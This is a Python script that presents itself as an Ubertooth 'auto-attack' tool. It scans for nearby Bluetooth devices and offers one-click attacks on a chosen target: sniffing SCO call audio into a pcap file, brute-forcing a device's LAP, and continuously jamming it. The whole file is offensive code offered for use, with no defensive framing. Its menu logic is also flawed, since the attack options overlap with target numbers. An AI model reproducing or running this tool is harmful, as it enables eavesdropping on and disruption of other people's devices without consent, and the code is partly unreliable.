#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UBERTOOTH AUTO-ATTACK v666 - Scan & Strike Edition

import os
import sys
import subprocess
import re
import time
from datetime import datetime
import signal
import colorama
from colorama import Fore, Style

colorama.init()

class UbertoothAutoAttack:
    def __init__(self):
        self.running = True
        self.targets = []
        signal.signal(signal.SIGINT, self.signal_handler)
        self.show_banner()

    def show_banner(self):
        os.system('clear')
        print(f"""{Fore.MAGENTA}
   ___ _ _ _   ___ ___ _____ ___ ___ 
  | _ | | | |_| _ ) _|_   _|_ _/ _ \\
  | _ |_  _|_  _) _| | |  | | (_) |
  |___| |_| |_| |_|___| |_| |_|\___/
                                     
 ------------------------------------
    UBERTOOTH AUTO-ATTACK v666
   • Scan & Strike System •
   • One-Click Attacks  •
 ------------------------------------
{Style.RESET_ALL}""")

    def signal_handler(self, sig, frame):
        print(f"\n{Fore.RED}💀 Killing all processes{Style.RESET_ALL}")
        os.system("pkill -f 'ubertooth'")
        sys.exit(0)

    def scan_devices(self):
        """Scan for BT devices using Ubertooth only"""
        self.show_banner()
        print(f"{Fore.CYAN}🔍 Scanning for targets... (15 seconds){Style.RESET_ALL}")
        
        result = subprocess.run(["ubertooth-scan", "-t", "15"], 
                              capture_output=True, text=True)
        
        self.targets = []
        for line in result.stdout.split('\n'):
            if 'BD_ADDR' in line:
                bd_addr = re.search(r'BD_ADDR: (([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})', line)
                lap = re.search(r'LAP: (0x[0-9A-Fa-f]{6})', line)
                if bd_addr and lap:
                    self.targets.append((bd_addr.group(1), lap.group(1)))
        
        return len(self.targets) > 0

    def attack_menu(self):
        while self.running:
            self.show_banner()
            print(f"\n{Fore.GREEN}=== TARGET LIST ==={Style.RESET_ALL}")
            for i, (bd_addr, lap) in enumerate(self.targets, 1):
                print(f"{i}. {bd_addr} [LAP: {lap}]")
            
            print(f"\n{Fore.RED}=== ATTACK OPTIONS ==={Style.RESET_ALL}")
            print("1. Audio Hijack (SCO Sniffing)")
            print("2. LAP Bruteforce Attack")
            print("3. Channel Jamming")
            print("4. Rescan Devices")
            print("5. Exit")
            
            choice = input("\nSelect target number or option: ")
            
            if choice == "4":
                self.scan_devices()
            elif choice == "5":
                self.running = False
            elif choice.isdigit() and 0 < int(choice) <= len(self.targets):
                target = self.targets[int(choice)-1]
                self.launch_attack(target)
            else:
                print(f"{Fore.RED}Invalid selection!{Style.RESET_ALL}")
                time.sleep(1)

    def launch_attack(self, target):
        bd_addr, lap = target
        self.show_banner()
        print(f"\n{Fore.RED}⚔️ PREPARING ATTACK ON {bd_addr}{Style.RESET_ALL}")
        print("1. Quick SCO Sniff (10 seconds)")
        print("2. Full LAP Bruteforce")
        print("3. Continuous Jam")
        
        attack = input("Select attack type: ")
        
        if attack == "1":
            pcap = f"attack_{bd_addr.replace(':', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
            os.system(f"ubertooth-bt -S -t 10 -c {pcap}")
            print(f"{Fore.GREEN}🎧 Captured audio saved to {pcap}{Style.RESET_ALL}")
        elif attack == "2":
            os.system(f"ubertooth-bt -l {lap} -B -f")
        elif attack == "3":
            os.system(f"ubertooth-jam -b -t {bd_addr}")
        else:
            print(f"{Fore.RED}Invalid attack!{Style.RESET_ALL}")
        
        input("\nPress Enter to return...")

    def main(self):
        if os.geteuid() != 0:
            print(f"{Fore.RED}Must be root! Run with sudo{Style.RESET_ALL}")
            sys.exit(1)
        
        if not self.scan_devices():
            print(f"{Fore.RED}No targets found!{Style.RESET_ALL}")
            sys.exit(1)
            
        self.attack_menu()

if __name__ == "__main__":
    attacker = UbertoothAutoAttack()
    try:
        attacker.main()
    except Exception as e:
        print(f"{Fore.RED}Critical error: {e}{Style.RESET_ALL}")
    finally:
        attacker.signal_handler(None, None)
